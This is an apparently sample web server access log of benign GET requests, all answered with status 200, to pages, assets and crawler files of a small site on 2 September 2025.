192.168.1.12 - - [02/Sep/2025:21:32:15 +0700] "GET /login.php HTTP/1.1" 200 7015 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:20:21:15 +0700] "GET /news.php?page=2 HTTP/1.1" 200 907 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:19:04:30 +0700] "GET /news.php?page=2 HTTP/1.1" 200 10715 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:50:51 +0700] "GET /news.php?page=2 HTTP/1.1" 200 9320 "-" "Edge/18.18363"
192.168.1.11 - - [02/Sep/2025:21:19:35 +0700] "GET /assets/main.js HTTP/1.1" 200 7894 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:19:21:47 +0700] "GET /assets/style.css HTTP/1.1" 200 1301 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:21:37:05 +0700] "GET /contact.php HTTP/1.1" 200 6642 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:21:58:24 +0700] "GET /blog/post3 HTTP/1.1" 200 9834 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:08:08 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 3382 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:26:15 +0700] "GET /checkout.php HTTP/1.1" 200 2245 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:19:06:00 +0700] "GET /api/data?id=42 HTTP/1.1" 200 8134 "-" "Mozilla/5.0"
192.168.1.12 - - [02/Sep/2025:19:44:04 +0700] "GET /about.php HTTP/1.1" 200 7446 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:19:28:56 +0700] "GET /contact.php HTTP/1.1" 200 6746 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:21:21:30 +0700] "GET /index.php HTTP/1.1" 200 5824 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:14:10 +0700] "GET /index.php HTTP/1.1" 200 8695 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:22:06:28 +0700] "GET /login.php HTTP/1.1" 200 10914 "-" "Edge/18.18363"
192.168.1.12 - - [02/Sep/2025:20:47:24 +0700] "GET /news.php?page=2 HTTP/1.1" 200 10901 "-" "Bingbot/2.0"
192.168.1.13 - - [02/Sep/2025:20:34:08 +0700] "GET /login.php HTTP/1.1" 200 1461 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:21:32:05 +0700] "GET /products.php?id=12 HTTP/1.1" 200 9092 "-" "Safari/537.36"
192.168.1.10 - - [02/Sep/2025:20:58:15 +0700] "GET /contact.php HTTP/1.1" 200 4401 "-" "Mozilla/5.0"
192.168.1.10 - - [02/Sep/2025:19:08:26 +0700] "GET /blog/post2 HTTP/1.1" 200 6778 "-" "Chrome/120.0"
192.168.1.12 - - [02/Sep/2025:20:38:24 +0700] "GET /assets/app.js HTTP/1.1" 200 1989 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:55:25 +0700] "GET /checkout.php HTTP/1.1" 200 4334 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:38:28 +0700] "GET /images/banner.png HTTP/1.1" 200 1094 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:55:04 +0700] "GET /login.php HTTP/1.1" 200 7631 "-" "Chrome/120.0"
192.168.1.11 - - [02/Sep/2025:19:17:16 +0700] "GET /blog/post3 HTTP/1.1" 200 6292 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:07:09 +0700] "GET /api/data?id=42 HTTP/1.1" 200 11530 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:20:32:10 +0700] "GET /robots.txt HTTP/1.1" 200 4365 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:45:12 +0700] "GET /cart.php HTTP/1.1" 200 9117 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:22:12 +0700] "GET /cart.php HTTP/1.1" 200 10556 "-" "Bingbot/2.0"
192.168.1.10 - - [02/Sep/2025:21:46:16 +0700] "GET /blog/post2 HTTP/1.1" 200 3830 "-" "Safari/537.36"
192.168.1.12 - - [02/Sep/2025:20:30:30 +0700] "GET /sitemap.xml HTTP/1.1" 200 2759 "-" "Bingbot/2.0"
198.51.100.27 - - [02/Sep/2025:19:21:06 +0700] "GET /assets/app.js HTTP/1.1" 200 4739 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:02:38 +0700] "GET /blog/post3 HTTP/1.1" 200 3515 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:21:57:05 +0700] "GET /dashboard.php HTTP/1.1" 200 11685 "-" "Edge/18.18363"
192.168.1.13 - - [02/Sep/2025:19:00:28 +0700] "GET /blog/post1 HTTP/1.1" 200 954 "-" "Mozilla/5.0"
192.168.1.11 - - [02/Sep/2025:19:30:07 +0700] "GET /contact.php HTTP/1.1" 200 2122 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:20:00:40 +0700] "GET /news.php?page=2 HTTP/1.1" 200 768 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.10 - - [02/Sep/2025:21:00:00 +0700] "GET /favicon.ico HTTP/1.1" 200 4085 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:19:54:56 +0700] "GET /blog/post2 HTTP/1.1" 200 3446 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.12 - - [02/Sep/2025:21:34:20 +0700] "GET /favicon.ico HTTP/1.1" 200 5854 "-" "Bingbot/2.0"
192.168.1.12 - - [02/Sep/2025:20:05:50 +0700] "GET /index.php HTTP/1.1" 200 1082 "-" "Chrome/120.0"
192.168.1.13 - - [02/Sep/2025:19:27:08 +0700] "GET /assets/main.js HTTP/1.1" 200 3525 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
198.51.100.27 - - [02/Sep/2025:19:20:08 +0700] "GET /assets/app.js HTTP/1.1" 200 6537 "-" "Edge/18.18363"
192.168.1.10 - - [02/Sep/2025:19:17:25 +0700] "GET /about.php HTTP/1.1" 200 3682 "-" "Safari/537.36"
192.168.1.11 - - [02/Sep/2025:20:22:20 +0700] "GET /products.php?id=12 HTTP/1.1" 200 1740 "-" "Googlebot/2.1 (+http://www.google.com/bot.html)"
192.168.1.11 - - [02/Sep/2025:20:04:58 +0700] "GET /blog/post1 HTTP/1.1" 200 6617 "-" "Mozilla/5.0"
198.51.100.27 - - [02/Sep/2025:20:24:48 +0700] "GET /profile.php?id=23 HTTP/1.1" 200 11325 "-" "Safari/537.36"
192.168.1.13 - - [02/Sep/2025:20:05:40 +0700] "GET /blog/post3 HTTP/1.1" 200 5573 "-" "Mozilla/5.0"
192.168.1.13 - - [02/Sep/2025:19:00:31 +0700] "GET /favicon.ico HTTP/1.1" 200 11630 "-" "Chrome/120.0"
192.168.1.10 - - [02/Sep/2025:19:05:31 +0700] "GET /assets/main.js HTTP/1.1" 200 8158 "-" "Mozilla/5.0"
